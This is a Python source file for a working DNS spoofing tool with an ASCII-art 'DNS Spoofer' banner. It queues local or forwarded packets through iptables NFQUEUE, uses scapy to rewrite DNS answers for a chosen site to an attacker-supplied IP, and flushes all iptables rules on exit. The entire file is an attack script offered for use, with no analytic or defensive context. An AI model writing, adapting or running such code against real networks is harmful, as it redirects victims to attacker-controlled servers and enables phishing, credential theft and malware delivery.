# iptables -I FORWARD -j NFQUEUE --queue-num 0 [The Queue number is User Specified] [This forwards the packets from remote computers to the NFQUEUE Chain.]
# iptables -I OUTPUT -j NFQUEUE --queue-num 0
# iptables -I INPUT -j NFQUEUE --queue-num 0   [These Two commands to be used on Local Computer.]
# DNSRR - DNS Resource Record
# DNSQR - DNS Question Record

import netfilterqueue
import scapy.all as scapy
from termcolor import colored
import pyfiglet
import sys
import os

try:
    print(colored(pyfiglet.figlet_format("DNS Spoofer", font = "poison"), "green"))
    site = raw_input(colored("Enter the Site to be spoofed >> ", "yellow"))
    site = site.decode("utf-8")
    spoof = raw_input(colored("Enter the Replacement Server IP >> ", "yellow"))
    spoof = spoof.decode("utf-8")
    machine = raw_input(colored("Choose the Machine to run Spoofer on >> ", "yellow"))
    if machine == "local":
        os.system('iptables -I OUTPUT -j NFQUEUE --queue-num 0')
        os.system('iptables -I INPUT -j NFQUEUE --queue-num 0')
    elif machine == "remote":
        os.system('iptables -I FORWARD -j NFQUEUE --queue-num 0')
    else:
        print(colored("[-] Machine Unrecognised. Choose between local or remote.", "yellow"))
        os.system('iptables --flush')
        sys.exit()

except KeyboardInterrupt:
    print(colored("[-] Ctrl-C Detected...Quitting..", "yellow"))
    os.system('iptables --flush')
    sys.exit()

def process_queue():
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packets)
    queue.run()

def process_packets(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if site in qname:
            print("[+] Spoofing Target")
            answer = scapy.DNSRR(rrname=qname, rdata= spoof)
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].chksum
            packet.set_payload(str(scapy_packet))
    packet.accept()

def launch_attack():
    print(colored("--------------------------------------------------", "yellow"))
    print(colored("[+] DNS Spoofer Running... Waiting for Traffic....", "green"))
    print(colored("--------------------------------------------------", "yellow"))
    try:
        process_queue()
    except KeyboardInterrupt:
        print(colored("[-] Ctrl-C Detected...Quitting..", "yellow"))
        os.system('iptables --flush')
        print(colored("[+] Restored IPTables Rules.", "yellow"))
        sys.exit()

launch_attack()